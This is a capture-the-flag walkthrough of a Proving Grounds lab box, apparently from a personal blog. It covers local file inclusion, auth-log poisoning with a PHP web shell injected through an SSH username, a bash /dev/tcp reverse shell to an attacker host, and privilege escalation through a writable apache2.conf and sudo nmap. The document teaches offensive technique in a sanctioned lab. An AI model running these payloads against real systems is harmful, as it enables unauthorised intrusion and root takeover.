---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/ha-natraj,489/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

As usual we start with a simple port scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn 192.168.103.80               
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-11 16:33 EST
Nmap scan report for 192.168.103.80
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.43 seconds
```

## dir busting
```bash
$ gobuster dir -u http://192.168.103.80 -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.103.80
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2023/01/11 16:34:44 Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 301) [Size: 318] [--> http://192.168.103.80/console/]
/images               (Status: 301) [Size: 317] [--> http://192.168.103.80/images/] 
/index.html           (Status: 200) [Size: 14497]                                   
/index.html           (Status: 200) [Size: 14497]                                   
                                                                                    
===============================================================
2023/01/11 16:42:07 Finished
===============================================================
```

---

# exploitation
## Local File Inclusion
Inside `/console` is a file named `file.php`. Guessing the parameter `file` reveals that is possible to read files from the remote system.

```http
GET /console/file.php?file=/etc/passwd HTTP/1.1
Host: 192.168.103.80
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Wed, 11 Jan 2023 21:51:47 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1398
Connection: close
Content-Type: text/html; charset=UTF-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
```

> Yay it works! Now lets check if we might have have a local file inclusion.
{: .prompt-info }

If we try to load the file `file.php` itself the server responds with an error.

```http
GET /console/file.php?file=file.php HTTP/1.1
Host: 192.168.103.80
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```http
HTTP/1.0 500 Internal Server Error
Date: Wed, 11 Jan 2023 21:55:17 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

The response is a `500` error. This indicates that the server tried to interpret the `PHP` code but failed.  

So in the next step we try to identify files on the server we can include and are prone to a poisoning attack.

We are using a `seclists` wordlist via the `LFI` to idenfity which files we can access. Therefore we use the burp intruder with the `/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` wordlist.
Burp identified several files which can be read.  

> Interesting is the file `/var/log/auth.log` as it can be used in a log poisoning vector to get code execution.
{: .prompt-info }

```http
GET /console/file.php?file=%2fvar%2flog%2fauth%2elog HTTP/1.1
Host: 192.168.103.80
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Wed, 11 Jan 2023 21:43:48 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 3980
Connection: close
Content-Type: text/html; charset=UTF-8

Sep  2 05:09:55 ubuntu sshd[360]: Received signal 15; terminating.
Oct 17 19:30:24 ubuntu systemd-logind[370]: New seat seat0.
Oct 17 19:30:24 ubuntu systemd-logind[370]: Watching system buttons on /dev/input/event0 (Power Button)
Oct 17 19:30:24 ubuntu systemd-logind[370]: Watching system buttons on /dev/input/event1 (AT Translated Set 2 keyboard)
Oct 17 19:30:24 ubuntu sshd[406]: Server listening on 0.0.0.0 port 22.
Oct 17 19:30:24 ubuntu sshd[406]: Server listening on :: port 22.
Oct 17 19:31:01 ubuntu CRON[694]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 17 19:31:01 ubuntu CRON[694]: pam_unix(cron:session): session closed for user root
Oct 17 19:32:01 ubuntu CRON[697]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 17 19:32:01 ubuntu CRON[697]: pam_unix(cron:session): session closed for user root
Oct 17 19:32:42 ubuntu VGAuth[376]: vmtoolsd: Username and password successfully validated for 'root'.
Oct 17 19:32:45 ubuntu VGAuth[376]: message repeated 8 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
Jan 11 13:32:05 ubuntu VGAuth[376]: vmtoolsd: Username and password successfully validated for 'root'.
Jan 11 13:32:13 ubuntu VGAuth[376]: message repeated 5 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
Jan 11 13:32:15 ubuntu CRON[916]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:32:15 ubuntu CRON[916]: pam_unix(cron:session): session closed for user root
Jan 11 13:32:17 ubuntu VGAuth[376]: vmtoolsd: Username and password successfully validated for 'root'.
Jan 11 13:32:18 ubuntu VGAuth[376]: message repeated 2 times: [ vmtoolsd: Username and password successfully validated for 'root'.]
Jan 11 13:33:01 ubuntu CRON[922]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:33:01 ubuntu CRON[922]: pam_unix(cron:session): session closed for user root
Jan 11 13:34:01 ubuntu CRON[927]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:34:01 ubuntu CRON[927]: pam_unix(cron:session): session closed for user root
Jan 11 13:35:01 ubuntu CRON[938]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:35:01 ubuntu CRON[938]: pam_unix(cron:session): session closed for user root
Jan 11 13:36:01 ubuntu CRON[944]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:36:01 ubuntu CRON[944]: pam_unix(cron:session): session closed for user root
Jan 11 13:37:01 ubuntu CRON[947]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:37:01 ubuntu CRON[947]: pam_unix(cron:session): session closed for user root
Jan 11 13:38:01 ubuntu CRON[951]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:38:01 ubuntu CRON[951]: pam_unix(cron:session): session closed for user root
Jan 11 13:39:01 ubuntu CRON[1012]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:39:01 ubuntu CRON[1011]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:39:01 ubuntu CRON[1012]: pam_unix(cron:session): session closed for user root
Jan 11 13:39:01 ubuntu CRON[1011]: pam_unix(cron:session): session closed for user root
Jan 11 13:40:01 ubuntu CRON[1018]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:40:01 ubuntu CRON[1018]: pam_unix(cron:session): session closed for user root
Jan 11 13:41:01 ubuntu CRON[1021]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:41:01 ubuntu CRON[1021]: pam_unix(cron:session): session closed for user root
Jan 11 13:42:01 ubuntu CRON[1024]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:42:01 ubuntu CRON[1024]: pam_unix(cron:session): session closed for user root
Jan 11 13:43:01 ubuntu CRON[1027]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 11 13:43:01 ubuntu CRON[1027]: pam_unix(cron:session): session closed for user root
```

In the next step we will poison the auth log with a simple `PHP` shell by using `ssh` to connect to the target with a malicious username.

## injecting the shell
payload: `<?php system($_REQUEST['c']) ?>`
```bash
$ ssh "<?php system(\$_REQUEST['c']) ?>"@192.168.103.80
<?php system($_REQUEST['c']) ?>@192.168.103.80's password: 
Permission denied, please try again.
```

## accessing the web shell
```http
GET /console/file.php?file=%2fvar%2flog%2fauth%2elog&c=id HTTP/1.1
Host: 192.168.103.80
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Wed, 11 Jan 2023 22:04:39 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 9463
Connection: close
Content-Type: text/html; charset=UTF-8

Sep  2 05:09:55 ubuntu sshd[360]: Received signal 15; terminating.
Oct 17 19:30:24 ubuntu systemd-logind[370]: New seat seat0.
Oct 17 19:30:24 ubuntu systemd-logind[370]: Watching system buttons on /dev/input/event0 (Power Button)
Oct 17 19:30:24 ubuntu systemd-logind[370]: Watching system buttons on /dev/input/event1 (AT Translated Set 2 keyboard)
Oct 17 19:30:24 ubuntu sshd[406]: Server listening on 0.0.0.0 port 22.
Oct 17 19:30:24 ubuntu sshd[406]: Server listening on :: port 22.
Oct 17 19:31:01 ubuntu CRON[694]: pam_unix(cron:session): session opened for user root by (uid=0)
Oct 17 19:31:01 ubuntu CRON[694]: pam_unix(cron:session): session closed for user root
Oct 17 19:32:01 ubuntu CRON[697]: pam_unix(cron:session): session opened for user root by (uid=0)
...
Jan 11 13:48:01 ubuntu CRON[1051]: pam_unix(cron:session): session closed for user root
Jan 11 13:48:27 ubuntu sshd[1054]: Invalid user uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```

> It worked! We got code execution!
{: .prompt-info }

---

# post exploitation
## reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80 
listening on [any] 80 ...
```

### trigger reverse shell
payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.103/80 0>&1'`
```http
GET /console/file.php?file=%2fvar%2flog%2fauth%2elog&c=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.103/80+0>%261' HTTP/1.1
Host: 192.168.103.80
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

### catch connect from target
```bash
$ nc -lvp 80 
listening on [any] 80 ...
192.168.103.80: inverse host lookup failed: Unknown host
connect to [192.168.49.103] from (UNKNOWN) [192.168.103.80] 37404
bash: cannot set terminal process group (562): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/console$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html/console$
```

> Reverse shell!
{: .prompt-info }

## get the first flag
```bash
www-data@ubuntu:/var/www/html/console$ ls
ls
file.php
www-data@ubuntu:/var/www/html/console$ cd ..
cd ..
www-data@ubuntu:/var/www/html$ ls
ls
console
font.css
images
index.html
style.css
www-data@ubuntu:/var/www/html$ cd ..
cd ..
www-data@ubuntu:/var/www$ ls
ls
html
local.txt
www-data@ubuntu:/var/www$ cat local.txt
cat local.txt
c******************************b
```

## privilege escalation
Checking `sudo -l` reveals that we are allowed to `start`, `stop` and `restart` the `apache2` web server with `sudo`
```bash
www-data@ubuntu:/var/www/html/console$ sudo -l   
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/systemctl start apache2
    (ALL) NOPASSWD: /bin/systemctl stop apache2
    (ALL) NOPASSWD: /bin/systemctl restart apache2
```

Using `linpeas.sh` shows that the following interesting files are world writeable.
```bash
...
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                                                                                                
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/etc/apache2/apache2.conf
/run/lock
/run/lock/apache2
/tmp
/tmp/linpeas.sh
...
```

> `/etc/apache2/apache2.conf` looks juicy.
{: .prompt-info }

In the default configuration all the files the web server accesses are executed by the user `www-data`.  
That is the reason we at the moment got a remote code execution as this user. Our goal is to change this user context to elevate our privileges. 
  
> As we are allowed to overwrite the `apache2.conf` file, it should be possible to change the user context to another existing user who has probably more privileges then `www-data`.
{: .prompt-info }

The following users are available on the target system:
```bash
www-data@ubuntu:/etc/apache2$ ls -lsah /home
total 16K
4.0K drwxr-xr-x  4 root    root    4.0K Jun  3  2020 .
4.0K drwxr-xr-x 22 root    root    4.0K Jul  2  2020 ..
4.0K drwxr-xr-x  4 mahakal mahakal 4.0K Aug  7  2020 mahakal
4.0K drwxr-xr-x  4 natraj  natraj  4.0K Jun  3  2020 natraj
```

In the next step we change the following lines of the file `apache2.conf`
```bash
...
# These need to be set in /etc/apache2/envvars
User ${APACHE_RUN_USER}
Group ${APACHE_RUN_GROUP}
...
```

We change these settings to the following values.
```bash
...
# These need to be set in /etc/apache2/envvars
User mahakal
Group mahakal
...
```

Now we restart the `apache2` service.
```bash
www-data@ubuntu:/etc/apache2$ sudo /bin/systemctl restart apache2
```

As soon as we do this our reverse shell gets terminated.  
Lets get a new reverse shell.

### start listener on the attackers machine
```bash
$ nc -lvp 80                                                                                                                                                       
listening on [any] 80 ...
```

### trigger reverse shell
payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.103/80 0>&1'`
```http
GET /console/file.php?file=%2fvar%2flog%2fauth%2elog&c=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.103/80+0>%261' HTTP/1.1
Host: 192.168.103.80
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
nt-Length: 3
Content-Length: 3
```

### catch connection from target
```bash
$ nc -lvp 80                                                                                                                                                                                                                          4 ⨯
listening on [any] 80 ...
192.168.103.80: inverse host lookup failed: Unknown host
connect to [192.168.49.103] from (UNKNOWN) [192.168.103.80] 42904
bash: cannot set terminal process group (982): Inappropriate ioctl for device
bash: no job control in this shell
mahakal@ubuntu:/var/www/html/console$
```

> It worked! We are now `mahakal`!
{: .prompt-info }

Now the checks for common privilege escalation techniques start again.  
We begin with checking our `sudo` permissions.
```bash
mahakal@ubuntu:/var/www/html/console$ sudo -l
sudo -l
Matching Defaults entries for mahakal on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mahakal may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap
```

Checking `nmap` on [`gtfobins`](https://gtfobins.github.io/gtfobins/nmap/#sudo) shows that we can escalate to `root` using it in the following way.
```bash
mahakal@ubuntu:/tmp$ TF=$(mktemp)
TF=$(mktemp)
mahakal@ubuntu:/tmp$ echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
mahakal@ubuntu:/tmp$ sudo nmap --script=$TF
sudo nmap --script=$TF

Starting Nmap 7.60 ( https://nmap.org ) at 2023-01-11 22:19 PST
NSE: Warning: Loading '/tmp/tmp.1q24AQ7LgQ' -- the recommended file extension is '.nse'.
id
uid=0(root) gid=0(root) groups=0(root)
```

> We got root!
{: .prompt-info }

## get second flag
```bash
cd /root
ls -lsah
total 36K
4.0K drwx------  5 root root 4.0K Jan 11 22:11 .
4.0K drwxr-xr-x 22 root root 4.0K Jul  2  2020 ..
   0 -rw-------  1 root root    0 Sep  2  2020 .bash_history
4.0K -rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
4.0K drwx------  2 root root 4.0K Jul  2  2020 .cache
4.0K drwx------  3 root root 4.0K Jul  2  2020 .gnupg
4.0K drwxr-xr-x  3 root root 4.0K Jun  3  2020 .local
4.0K -rw-r--r--  1 root root  148 Aug 17  2015 .profile
4.0K -rw-r--r--  1 root root   33 Jan 11 22:11 proof.txt
4.0K -rw-r--r--  1 root root   32 Aug 18  2020 root.txt
cat proof.txt
b******************************c
```

Pwned! <@:-)
